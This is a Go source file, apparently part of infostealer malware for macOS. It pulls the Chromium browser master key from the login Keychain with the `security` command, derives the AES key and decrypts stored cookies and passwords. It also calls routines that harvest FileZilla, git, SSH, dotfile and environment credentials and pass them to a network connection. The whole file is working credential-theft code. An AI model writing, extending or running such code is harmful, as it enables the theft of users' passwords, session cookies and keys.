//go:build darwin

package main

// macOS credential collection. Chromium's master password lives in the login
// Keychain as a generic password named "<Browser> Safe Storage"; `security
// find-generic-password -w` returns it once the keychain is unlocked, which it
// normally is for the logged-in user session.

import (
	"net"
	"os/exec"
	"strings"
)

func keychainService(browser string) string {
	switch browser {
	case "Chrome":
		return "Chrome Safe Storage"
	case "Edge":
		return "Microsoft Edge Safe Storage"
	case "Brave":
		return "Brave Safe Storage"
	case "Chromium":
		return "Chromium Safe Storage"
	case "Opera":
		return "Opera Safe Storage"
	}
	return browser + " Safe Storage"
}

func keychainPassword(service string) string {
	cmd := exec.Command("security", "find-generic-password", "-w", "-s", service)
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func newSecretBox(br browserRoot) (*secretBox, string) {
	svc := keychainService(br.name)
	pass := keychainPassword(svc)
	if pass == "" {
		return &secretBox{scheme: "none"}, "Keychain 无 " + svc + "（未解锁或浏览器未运行过）"
	}
	key, err := deriveKey(pass, "saltysalt", 1003, 16)
	if err != nil {
		return &secretBox{scheme: "none"}, "PBKDF2 失败: " + err.Error()
	}
	return &secretBox{key: key, scheme: "v10 AES-128-CBC + Keychain"}, "v10 AES-128-CBC + Keychain(" + svc + ")"
}

func (b *secretBox) decrypt(blob []byte, cookie bool) (string, bool) {
	plain, ok := cbcDecrypt(b.key, blob)
	if !ok {
		return "", false
	}
	if cookie {
		plain = stripCookiePrefix(plain)
	}
	return strings.TrimRight(string(plain), "\x00"), true
}

func (b *secretBox) failNote(blob []byte) string {
	if len(b.key) == 0 {
		return "无 Keychain 主密钥，无法解密"
	}
	return "解密失败（可能由其他用户或浏览器版本写入）"
}

func collectSystemCreds(c net.Conn) {
	fileZilla(c)
	dotfileSecrets(c)
	gitCredentials(c)
	sshKeys(c)
	envSecrets(c)
}
